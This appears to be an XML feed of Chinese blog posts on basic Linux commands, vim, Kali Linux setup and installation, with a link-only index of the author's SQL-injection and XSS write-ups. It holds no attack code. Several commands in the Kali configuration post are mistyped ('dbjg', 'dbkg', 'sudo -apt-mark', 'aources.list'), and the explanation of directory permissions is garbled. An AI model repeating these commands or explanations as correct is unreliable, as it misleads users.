      <title>Linux常用命令（二）</title>
      <link href="/2020/031748230.html"/>
      <url>/2020/031748230.html</url>
      
        <content type="html"><![CDATA[<h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><hr><h3 id="0x01-cat命令"><a href="#0x01-cat命令" class="headerlink" title="0x01 . cat命令"></a><code>0x01</code> . cat命令</h3><blockquote><p>cat命令用于查看纯文本文件（内容较少的），格式为“cat [选项] [文件]”。 如图，继上一篇里面我的创建文档，</p></blockquote><blockquote><p>里面只有hello world单词</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204341704.png" alt=""></p><h3 id="0x02-more命令"><a href="#0x02-more命令" class="headerlink" title="0x02. more命令"></a><code>0x02</code>. more命令</h3><blockquote><p>more命令用于查看纯文本文件（内容较多的），格式为“more [选项]文件”。 刚好昨天我昨天对6个网站进行nmap探测</p></blockquote><blockquote><p>这时候可以用more命令查看</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204520717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="0x03-head命令"><a href="#0x03-head命令" class="headerlink" title="0x03. head命令"></a><code>0x03</code>. head命令</h3><blockquote><p>head命令用于查看纯文本文档的前N行，格式为“head [选项] [文件]”。</p><p>head -n 3 url.txt   就会看到前3行的url，文件里有6行url</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204600646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="0x04-wc命令"><a href="#0x04-wc命令" class="headerlink" title="0x04. wc命令"></a><code>0x04</code>. wc命令</h3><blockquote><p>wc命令用于统计指定文本的行数、字数、字节数，格式为“wc [参数] 文本”。 </p></blockquote><blockquote><p>wc –help  就可以查看具体参数了</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204633754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="0x05-stat命令"><a href="#0x05-stat命令" class="headerlink" title="0x05.stat命令"></a><code>0x05</code>.stat命令</h3><blockquote><p>stat命令用于查看文件的具体存储信息和时间等信息，格式为“stat 文件名称”</p></blockquote><blockquote><p>stat hello.txt   操作简单，一看就懂</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020031720470926.png" alt=""></p><h3 id="0x06-touch命令"><a href="#0x06-touch命令" class="headerlink" title="0x06. touch命令"></a><code>0x06</code>. touch命令</h3><blockquote><p>touch命令用于创建空白文件或设置文件的时间，</p><p>格式为<code>touch [选项] [文件]</code></p></blockquote><blockquote><p>写py的时候也可以这样创建个文件</p></blockquote><h3 id="0x07-mkdir命令"><a href="#0x07-mkdir命令" class="headerlink" title="0x07. mkdir命令"></a><code>0x07</code>. mkdir命令</h3><blockquote><p>mkdir命令用于创建空白的目录，格式为“mkdir [选项] 目录”。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204815429.png" alt=""></p><h3 id="0x08-cp命令"><a href="#0x08-cp命令" class="headerlink" title="0x08.cp命令"></a><code>0x08</code>.cp命令</h3><blockquote><p>cp命令用于复制文件或目录，<br>格式为“<code>cp [选项] 源文件 目标文件</code>”。<br> 随便 cp hello.txt    或者复制目录 cp love</p></blockquote><h3 id="0x09-mv命令"><a href="#0x09-mv命令" class="headerlink" title="0x09. mv命令"></a><code>0x09</code>. mv命令</h3><blockquote><p>mv命令用于移动文件或将文件重命名</p></blockquote><blockquote><p>格式为“mv [选项] 源文件 [目标路径|目标文件名]”。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204911329.png" alt=""></p><h3 id="0x10-file命令"><a href="#0x10-file命令" class="headerlink" title="0x10. file命令"></a><code>0x10</code>. file命令</h3><blockquote><p>file命令用于查看文件的类型，格式为“file 文件名”。</p></blockquote><h3 id="0x11-tar命令"><a href="#0x11-tar命令" class="headerlink" title="0x11. tar命令"></a><code>0x11</code>. tar命令</h3><blockquote><p>tar命令用于对文件进行打包压缩或解压，格式为“tar [选项] [文件]”。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204957177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="0x12-find命令"><a href="#0x12-find命令" class="headerlink" title="0x12. find命令"></a><code>0x12</code>. find命令</h3><blockquote><p>find命令用于按照指定条件来查找文件，格式为“find [查找路径] 寻找条件 操作”</p></blockquote><h2 id="使用chmod命令进行文件的权限修改"><a href="#使用chmod命令进行文件的权限修改" class="headerlink" title="使用chmod命令进行文件的权限修改"></a><code>使用chmod命令进行文件的权限修改</code></h2><p><code>chmod [选项] &lt;模式,模式...&gt; &lt;文件名...&gt;</code></p><p>文件和目录的权限<br>linux中文件和目录的权限有所不同</p><p><strong>文件的权限:</strong><br>r 可以读文件       数值为  4<br>w 可以写文件  数值为 2<br>x 可以执行文件  数值为1</p><p><strong>目录的权限:</strong></p><p><code>xr</code> 可以读取（cp）和查看（ls）目录的内容（即文件和目录），同时还需要可执行权限</p><p><code>xw</code> 可以在目录里创建文件（touch）和目录（mkdir）和删除文件（rm）和目录（rmdir），同时还需要可执行权限</p><p><code>xx</code> 可以进入目录（cd）和执行文件 实践过程 </p>]]></content>
      
      
      <categories>
          
          <category> Liunx </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2020/031711755.html"/>
      <url>/2020/031711755.html</url>
      
        <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>废话不多说，冲冲冲<br>什么是shell呢？<br><img src="https://img-blog.csdnimg.cn/20200211113656866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看看这张图，早期是开机后直接面对黑黑的命令行，shell命令才能控制其他软件</p><p><strong>shell</strong> ：是为用户与机器之间搭建成的一个桥梁，让我们能够通过shell来对计算机进行操作和交互，从而达到让计算机为我们服务的目的。<br><img src="https://img-blog.csdnimg.cn/20200211145731715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>shell与终端的区别</strong><br><strong>终端</strong>：<em>接收用户的输入，并传递给shell程序，接收程序输出并展示到屏幕</em><br><strong>shell</strong>： <em>接收并解析用户的命令给操作系统执行，将结果输出到终端</em></p><h1 id="vim的使用"><a href="#vim的使用" class="headerlink" title="vim的使用"></a>vim的使用</h1><p>我们写文档的时候会通过编辑器来编辑文档<br>vim是kali linux自带的编辑器<br>vim的作用<br> 1.编写代码<br>2. 编写文档</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先使用touch命令，创建文件<br>touch  hello.txt</p><p><img src="https://img-blog.csdnimg.cn/20200211150048361.png" alt="在这里插入图片描述"><br>我们在进入文件，进行修改编辑文档，这就是vim的用处之一</p><p>使用 <code>vim hello.txt</code>就可以进入编辑了</p><h3 id="0x02进入文档，进行编辑"><a href="#0x02进入文档，进行编辑" class="headerlink" title="0x02进入文档，进行编辑"></a>0x02进入文档，进行编辑</h3><p><img src="https://img-blog.csdnimg.cn/2020021115023414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我输入 的话按个字母i<br><img src="https://img-blog.csdnimg.cn/20200211165725914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>会显示插入，这时候就可以书写了<br>然后我写入hello world文本<br><img src="https://img-blog.csdnimg.cn/20200211165326706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如何保存退出嘞？<br>先按下键盘的右上角的Esc会像下图显示<br><img src="https://img-blog.csdnimg.cn/20200211165631237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="退出写入模式"><br>会退出写入模式<br>然后再按<code>shift</code> + <code>:</code> 号<br><img src="https://img-blog.csdnimg.cn/20200211165913383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候会显示一个 冒号，我们输入wq，就可以退出了<br><img src="https://img-blog.csdnimg.cn/20200211170003338.png" alt="在这里插入图片描述"><br>w：保存<br>q：退出<br>wq 和 x 都是保存退出<br>q！：强制退出<br>w！：强制保存，管理员才有权限<br>insert 键: 在键盘的回退键旁边，点 ins 可以直接切换到插入模式</p><p>单独写一个w，是保存，但不退出<br>单独写一个q，是退出，不保存<br>wq 和 x  都是保存退出<br>q！是强制退出，不会保存<br>w! 是强制保存，单不会退出<br>这样就看的懂吧<br><strong>下面是一些其他的方式</strong></p><pre class=" language-bash"><code class="language-bash">i：在当前光标所在字符的前面，转为输入模式I：在当前光标所在行的行首转换为输入模式a：在当前光标所在字符的后面，转为输入模式A：在光标所在行的行尾，转换为输入模式o：在当前光标所在行的下方，新建一行，并转为输入模式O：在当前光标所在行的上方，新建一行，并转为输入模式s：删除光标所在字符r：替换光标处字符</code></pre><p>查找<br>普通模式：　<br>/PATTERN：从当前位置向后查找<br>？PATTERN：从当前位置向前查找</p><p><img src="https://img-blog.csdnimg.cn/20200211170320351.png" alt="在这里插入图片描述"></p><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p><strong>1.echo命令</strong><br>echo命令用于在终端输出字符串或变量提取后的值<br>格式为 “echo [字符串 | $变量]”。<br><img src="https://img-blog.csdnimg.cn/20200211171241584.png" alt="具体设计shell编程，我不会"><br><strong>2.date命令</strong><br>date命令用于显示及设置系统的时间或日期，格式为“date [选项] [+指定的格式]”。<br><img src="https://img-blog.csdnimg.cn/20200211171117872.png" alt="在这里插入图片描述"></p><p><strong>3.poweroff命令</strong><br>poweroff 是条关机的命令，其格式为poweroff。</p><p><strong>4.top命令</strong><br>显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率等，格式为“top [参数]”。</p><p>具体查看这篇博客<br><a href="https://www.cnblogs.com/niuben/p/12017242.html" target="_blank" rel="noopener">https://www.cnblogs.com/niuben/p/12017242.html</a></p><p><strong>5.ifconfig命令</strong></p><p>ifconfig命令用于获取网卡配置与网络状态等信息，格式为“ifconfig [网络设备] [参数]”。<br><img src="https://img-blog.csdnimg.cn/20200211171734559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>6.uname命令</strong></p><p>uname命令用于查看系统内核与系统版本等信息，格式为“uname [-a]”。<br><img src="https://img-blog.csdnimg.cn/20200211171810608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>7.who命令</strong></p><p>who用于查看当前登入主机的用户终端信息，格式为“who [参数]”。<br>这个不用我说了吧，不懂后面加个 –help<br><img src="https://img-blog.csdnimg.cn/20200211171850317.png" alt="在这里插入图片描述"></p><p><strong>8.history命令</strong></p><p>history命令用于显示历史执行过的命令，格式为“history [-c]”。<br><img src="https://img-blog.csdnimg.cn/20200211171945336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>9.pwd命令</strong></p><p>pwd命令用于显示用户当前所处的工作目录，格式为“pwd [选项]”。<br>注意，linux大小写敏感，千万不要小写<br><img src="https://img-blog.csdnimg.cn/20200211172156677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>10.cd命令</strong></p><p>cd命令用于切换工作路径，格式为“cd [目录名称]”。<br>这个就不用我说了吧<br><img src="https://img-blog.csdnimg.cn/20200211172307300.png" alt="在这里插入图片描述"></p><p><strong>11.ls命令</strong></p><p>ls命令用于显示目录中的文件信息，格式为“ls [选项] [文件] ”。</p><p>依然是你懂的~~</p><h2 id="文末"><a href="#文末" class="headerlink" title="文末"></a>文末</h2><p>内容比较多，接下来我会继续补全，我讲的是常用命令<br>有说错的地方评论指出，我会改正。<br>欢迎大佬们捧场，感兴趣的可以加我vx互相交流<br><img src="https://img-blog.csdnimg.cn/20200211173014847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_1,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_1,color_FFFFFF,t_10" alt="在这里插入图片描述"><br>（另外：我不是打广告，只是互相交流，人多了我会创个群，方便一起交流）</p>]]></content>
      
      
      <categories>
          
          <category> Liunx </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2020/031626401.html"/>
      <url>/2020/031626401.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>——————————————————————————————————————</p><p>这是我之前发布到的其他的一个网址，这里的话我重新总结</p><p>可能分很多，我也不是很清楚，只是皮毛的研究了一下</p><h2 id="1，sql按数据库分的话，常用的有："><a href="#1，sql按数据库分的话，常用的有：" class="headerlink" title="1，sql按数据库分的话，常用的有："></a>1，sql按数据库分的话，常用的有：</h2><p><strong>MySQL，access，oracle，ms sql</strong></p><h2 id="2，按传参类型，分"><a href="#2，按传参类型，分" class="headerlink" title="2，按传参类型，分"></a>2，按传参类型，分</h2><p>Get，Post，cookie</p><p>总而言之有：<br><code>盲注</code>       ：（盲注分布尔型，和时间型）<br><code>union注入</code>：（我叫他显错注入）<br><code>head注入</code> ： （在请求头注入）<br><code>Post注入</code>  ：（也就是对于表单的注入，例如登录框）</p><p>还有就是关于其他数据库的骚姿势，例如<strong>mysql</strong>的<strong>dnslog</strong>注入，<strong>mssql</strong>的反弹注入</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我也就废话不多说，写出来，这是我原本csdn写的，不想重复，就这样把对应地址贴出来</p><h4 id="Mysql数据库注入："><a href="#Mysql数据库注入：" class="headerlink" title="Mysql数据库注入："></a>Mysql数据库注入：</h4><p><code>1：union注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104343242" target="_blank" rel="noopener">点击查看</a></p><p><code>2：盲注：</code><br><a href="https://blog.csdn.net/m0_46304840/article/details/104640938" target="_blank" rel="noopener">布尔型</a><br><a href="https://blog.csdn.net/m0_46304840/article/details/104688966" target="_blank" rel="noopener">时间型</a><br><code>3：报错注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104733922" target="_blank" rel="noopener">点击查看</a><br><code>4：宽字节注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104758798" target="_blank" rel="noopener">点击查看</a><br><code>5：cookie注入&amp;base64注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104774792" target="_blank" rel="noopener">点击查看</a><br><code>6：head注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104805895" target="_blank" rel="noopener">xff头注入</a><br>————————————————————————————————————————</p><h4 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h4><p><code>偏移注入&amp;移位溢注&amp;逐字猜解：：</code></p><p><a href="https://blog.csdn.net/m0_46304840/article/details/104808825" target="_blank" rel="noopener">点击查看</a></p><h4 id="MS-SQL数据库注入"><a href="#MS-SQL数据库注入" class="headerlink" title="MS SQL数据库注入"></a>MS SQL数据库注入</h4><p><code>mssql-union注入：</code> <a href="https://blog.csdn.net/m0_46304840/article/details/104815241" target="_blank" rel="noopener">union注入</a><br><code>mssql-反弹注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104818304" target="_blank" rel="noopener">反弹注入</a></p><p>至于其他的还没写，以后直接更新到这里</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali的基本配置</title>
      <link href="/2020/031611755.html"/>
      <url>/2020/031611755.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-：vmware网络配置"><a href="#0x01-：vmware网络配置" class="headerlink" title="0x01 ：vmware网络配置"></a>0x01 ：vmware网络配置</h1><hr><p>在有下角有个网络适配器<br><img src="https://img-blog.csdnimg.cn/20200317004057207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>点击一下就出现了虚拟机设置<br><img src="https://img-blog.csdnimg.cn/20200317004201978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_5,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_14,color_FFFFFF,t_60" alt="在这里插入图片描述"><br>虚拟机有三个网络配置<br><code>1</code>：桥接模式（虚拟机和主机在同一个网络环境下的两台电脑）<br><code>2</code>：NAT模式（虚拟机通过主机联网）<br><code>3</code>：主机模式（只能虚拟机和主机直接交互）<br>前面2个应该比较熟悉，而第三个，意思就是无法ping通外网，只能虚拟机和宿主机直接互相ping通</p><h1 id="0x02：kali系统更新配置"><a href="#0x02：kali系统更新配置" class="headerlink" title="0x02：kali系统更新配置"></a>0x02：kali系统更新配置</h1><hr><p>更新配置这里使用老版本的，新版本的以后在弄（新版本msf依赖下载好慢，不习惯）</p><p>选择不更新 Metasploit<br><strong>1:</strong> 查看当前的系统中所有软件包状态</p><p><code>sudo dbjg --get-selections | more</code><br>这时候可以找打软件包为 “metasploit-framework”<br><strong>2:</strong> 给metasploit-framework锁定当前版本不更新</p><p><code>sudo apt-mark hold metasploit-framework</code><br><strong>3：</strong> 查看当前已锁定的软件包<br><code>sudo dbkg --get-selections | grep hold</code><br><strong>4:</strong> 取消软件保留设置</p><p><code>sudo -apt-mark unhold metasploit-framework</code><br>但是一般情况下的话不会去锁定哒<del>~</del></p><p><strong>kali系统更新后出现一些问题</strong><br>进入 <code>/usr/share/metasploit-framework</code> 目录下<br>使用命令</p><p><code>gem install bundler</code><br><code>gem update --system</code><br>然后就可以成功的启动了，具体可以问度娘的~~</p><h3 id="一、配置kali系统源"><a href="#一、配置kali系统源" class="headerlink" title="一、配置kali系统源"></a>一、配置kali系统源</h3><p><strong>1.</strong> 使用编辑器打开系统源文本<br><code>leafpad /etc/apt/aources.list</code></p><p><strong>2.</strong> 填写源</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#中科大</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span class="token comment" spellcheck="true">#阿里云</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="token comment" spellcheck="true">#清华大学</span>deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<span class="token comment" spellcheck="true">#163</span>deb http://mirrors.163.com/debian wheezy main non-free contribdeb-src http://mirrors.163.com/debian wheezy main non-free contribdeb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contribdeb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contribdeb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib<span class="token comment" spellcheck="true">#东软大学</span>deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib<span class="token comment" spellcheck="true">#官方源</span>deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre><p>任意选一个就好了，可以选清华，或者中科大</p><p><strong>3.</strong> 使用更新命令</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> upgrade <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> dist-upgrade</code></pre><h1 id="0x03：kali配置ssh服务"><a href="#0x03：kali配置ssh服务" class="headerlink" title="0x03：kali配置ssh服务"></a>0x03：kali配置ssh服务</h1><ol><li>开启ss服务</li></ol><p><code>service ssh start</code><br>2. 查看ssh服务状态</p><p><code>service ssh status</code><br>3. 关闭ssh服务</p><p><code>service ssh stop</code><br>步骤：<br>先是打开ssh服务，然后ifconfig查看虚拟机ip<br><img src="https://img-blog.csdnimg.cn/20200317011416793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就可以填主机，协议要选ssh<br>名称随意<br><img src="https://img-blog.csdnimg.cn/20200317011558319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后会提示我们输入用户名，就是虚拟机用户名<br>root （我的是root）<br>填写完后会要求我们输入密码<br><img src="https://img-blog.csdnimg.cn/20200317011712365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入你自己虚拟机的密码既可<br>然后点击记住密码，下次就可以直接登录了<br><img src="https://img-blog.csdnimg.cn/20200317011804574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现这个标志就说明成功了。啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020版本kali安装</title>
      <link href="/2020/031665118.html"/>
      <url>/2020/031665118.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>——————————————————————————————————————<br>总所周知，这个最新版本的变化很大（其实就是桌面变化大）<br>其实嘞，物竞天择，随时代潮流。我刚好想试一试，那么就安装一个最新版本的，kali 2020.1</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><blockquote><p>我相信大家的电脑都是windows<br>所以，我就直接复制下载地址</p></blockquote><p><code>https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</code><br><img src="https://img-blog.csdnimg.cn/20200316195043515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""></p><blockquote><p>进入这个地址<br>因为我有梯子，所以就不管那么多，直接点击下载了</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195117743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>下载了一局王者的世界，不要问我为什么（我打了一局王者，这个就下载好了）</p></blockquote><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><blockquote><p>下载后是个压缩包，这时候我们就解压。解压一下下就妥了</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020031619513425.png" alt="在这里插入图片描述"></p><blockquote><p>我就解压到这里来，丝毫不慌~~</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195140262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>找到vmx后缀的这个，右键点击vm打开</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195149984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>就是第一个，可以直接免手工安装<br>打开后的初始账号密码是 kali | kali</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195304992.png" alt="在这里插入图片描述"></p><blockquote><p>进入界面一瞄，发现不赖<br><code>kali-undercover</code>  使用这个命令，可以切换主题</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195317209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>不行不行，我爱了</p><p>幸亏还是不一样的（这样以后还是可以在朋友面前装逼）<br>再使用那个命令，就可以再切换回来，这里只是像windows，但是实际上命令还是得使用linux的</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195448651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>好吧，这有点不符合常理 这样的话以后会懵逼的，我丢</p></blockquote><blockquote><p>这是进入的是非管理员权限。这时候就要  <code>sudo su</code> 切换到管理员权限，然后修改密码用 <code>sudo passwd root</code><br>设置成你想要的密码</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020031619560873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>参考文章：<a href="https://www.moonsec.com/archives/762" target="_blank" rel="noopener">https://www.moonsec.com/archives/762</a> 这时候换源</p></blockquote><p><code>sudo vim /etc/apt/sources.list</code></p><h4 id="解决中文乱码"><a href="#解决中文乱码" class="headerlink" title="解决中文乱码"></a>解决中文乱码</h4><p><code>dpkg-reconfigure locales</code><br>进入图形化界面之后，（空格是选择，Tab是切换，带*是选中），<br>选中zh_CN.UTF-8，确定后，将zh_CN.UTF-8选为默认。</p><p><code>apt-get install xfonts-intl-chinese</code>  和 <code>apt-get install ttf-wqy-microhei</code> 来安装中文字体<br>然后重启1遍，如果不可以的话。就重启2遍就可以了<br>具体的网上有，我就不多描述了</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反射性xss</title>
      <link href="/2020/031648744.html"/>
      <url>/2020/031648744.html</url>
      
        <content type="html"><![CDATA[<p>没啥好说的，直接贴出我之前写的：<a href="https://mp.csdn.net/console/editor/html/104876310" target="_blank" rel="noopener">反射型xss</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>存储型&amp;dom型</title>
      <link href="/2020/0316476.html"/>
      <url>/2020/0316476.html</url>
      
